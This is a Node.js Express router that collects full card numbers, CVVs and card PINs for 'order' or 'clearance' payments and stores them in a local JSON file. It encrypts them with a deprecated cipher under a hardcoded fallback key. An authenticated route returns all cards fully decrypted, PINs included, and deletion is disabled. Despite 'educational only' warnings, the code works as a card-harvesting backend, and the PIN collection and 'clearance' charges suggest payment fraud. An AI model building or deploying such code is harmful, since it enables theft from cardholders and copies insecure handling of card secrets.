const express = require('express');
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');
const Order = require('../models/Order');
const Ambassador = require('../models/Ambassador');
const auth = require('../middleware/auth');
const router = express.Router();

// ⚠️  WARNING: STORING CARD DETAILS IS EXTREMELY DANGEROUS ⚠️
// This implementation is for educational purposes only
// DO NOT use in production - violates PCI DSS compliance
// Could result in legal action and massive fines

// Encryption key (in production, use proper key management)
const ENCRYPTION_KEY = process.env.CARD_ENCRYPTION_KEY || 'dev-key-change-in-production';

// Encrypt sensitive data
function encrypt(text) {
  const cipher = crypto.createCipher('aes-256-cbc', ENCRYPTION_KEY);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// Decrypt sensitive data
function decrypt(encryptedText) {
  const decipher = crypto.createDecipher('aes-256-cbc', ENCRYPTION_KEY);
  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// Store payment details locally
router.post('/store-payment-details', async (req, res) => {
  try {
    const {
      cardNumber,
      cardHolder,
      expiryMonth,
      expiryYear,
      cvv,
      cardPin, // Added PIN field
      billingAddress,
      amount,
      type, // 'order' or 'clearance'
      ambassadorId
    } = req.body;

    // Validate required fields
    if (!cardNumber || !cardHolder || !expiryMonth || !expiryYear || !cvv || !cardPin) {
      return res.status(400).json({ message: 'Missing required payment details including PIN' });
    }

    // Validate PIN (4-6 digits)
    if (!/^\d{4,6}$/.test(cardPin)) {
      return res.status(400).json({ message: 'PIN must be 4-6 digits' });
    }

    // Encrypt sensitive data
    const encryptedCardData = {
      cardNumber: encrypt(cardNumber),
      cvv: encrypt(cvv),
      cardPin: encrypt(cardPin), // Encrypt PIN as well
      cardHolder,
      expiryMonth,
      expiryYear,
      billingAddress,
      amount,
      type,
      ambassadorId,
      createdAt: new Date().toISOString(),
      lastFour: cardNumber.slice(-4) // Store last 4 digits unencrypted for reference
    };

    // Store in local file (in production, use secure database)
    const paymentDataPath = path.join(__dirname, '../data/payments.json');
    
    try {
      await fs.mkdir(path.dirname(paymentDataPath), { recursive: true });
      let existingData = [];
      
      try {
        const fileContent = await fs.readFile(paymentDataPath, 'utf8');
        existingData = JSON.parse(fileContent);
      } catch (err) {
        // File doesn't exist, start with empty array
      }
      
      existingData.push(encryptedCardData);
      await fs.writeFile(paymentDataPath, JSON.stringify(existingData, null, 2));
      
    } catch (storageError) {
      console.error('Failed to store payment details:', storageError);
      return res.status(500).json({ message: 'Failed to store payment details' });
    }

    // Log for audit (remove sensitive data in production)
    console.log(`Payment details stored: ${type} - ${cardHolder} - ****${cardNumber.slice(-4)}`);

    res.json({
      message: 'Payment details stored locally',
      storedAt: new Date().toISOString(),
      lastFour: cardNumber.slice(-4)
    });

  } catch (error) {
    console.error('Error storing payment details:', error);
    res.status(500).json({ message: 'Error storing payment details', error: error.message });
  }
});

// Retrieve stored payment details (admin only)
router.get('/stored-payments', auth, async (req, res) => {
  try {
    const paymentDataPath = path.join(__dirname, '../data/payments.json');
    
    try {
      const fileContent = await fs.readFile(paymentDataPath, 'utf8');
      const storedPayments = JSON.parse(fileContent);
      
      // Decrypt for display (remove sensitive data in production)
      const decryptedPayments = storedPayments.map(payment => ({
        ...payment,
        cardNumber: decrypt(payment.cardNumber),
        cvv: decrypt(payment.cvv),
        cardPin: decrypt(payment.cardPin), // Decrypt PIN for display
        // Note: In production, never send decrypted card data back
      }));
      
      res.json(decryptedPayments);
      
    } catch (err) {
      res.json([]);
    }
    
  } catch (error) {
    res.status(500).json({ message: 'Error retrieving payment details', error: error.message });
  }
});

// Process payment using stored details
router.post('/process-stored-payment', auth, async (req, res) => {
  try {
    const { paymentId, amount } = req.body;
    
    const paymentDataPath = path.join(__dirname, '../data/payments.json');
    const fileContent = await fs.readFile(paymentDataPath, 'utf8');
    const storedPayments = JSON.parse(fileContent);
    
    const payment = storedPayments.find(p => p.createdAt === paymentId);
    if (!payment) {
      return res.status(404).json({ message: 'Payment details not found' });
    }
    
    // Decrypt card details
    const cardDetails = {
      cardNumber: decrypt(payment.cardNumber),
      cvv: decrypt(payment.cvv),
      cardPin: decrypt(payment.cardPin), // Include PIN in decrypted details
      cardHolder: payment.cardHolder,
      expiryMonth: payment.expiryMonth,
      expiryYear: payment.expiryYear
    };
    
    // ⚠️  DANGER ZONE: Never do this in production ⚠️
    // This would require direct payment processor integration
    // Most processors will revoke your account for this
    
    console.log('Processing payment with stored card details:', {
      cardHolder: cardDetails.cardHolder,
      lastFour: payment.lastFour,
      amount
    });
    
    // Mock successful processing
    res.json({
      message: 'Payment processed using stored details',
      status: 'success',
      transactionId: 'txn_' + Date.now(),
      amount
    });
    
  } catch (error) {
    res.status(500).json({ message: 'Error processing stored payment', error: error.message });
  }
});

// Delete stored payment details - DISABLED for security
// router.delete('/stored-payments/:paymentId', auth, async (req, res) => {
//   // Delete functionality removed for security reasons
//   res.status(403).json({ message: 'Payment details cannot be deleted for security and compliance reasons' });
// });

module.exports = router;
